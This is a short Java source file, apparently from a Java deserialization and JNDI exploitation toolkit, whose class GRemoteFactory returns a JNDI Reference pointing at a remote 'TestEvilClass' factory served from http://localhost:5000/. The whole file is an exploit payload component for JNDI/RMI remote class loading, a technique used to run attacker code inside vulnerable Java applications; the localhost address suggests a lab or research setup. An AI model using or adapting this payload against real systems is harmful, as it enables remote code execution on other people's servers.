package xyz.eki.marshalexp.gadget.jndi.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;

public class GRemoteFactory {
    public static Reference getPayload() {
        Reference reference = new Reference("xxx", "xyz.eki.marshalexp.exploit.TestEvilClass", "http://localhost:5000/");
        return reference;
    }
}
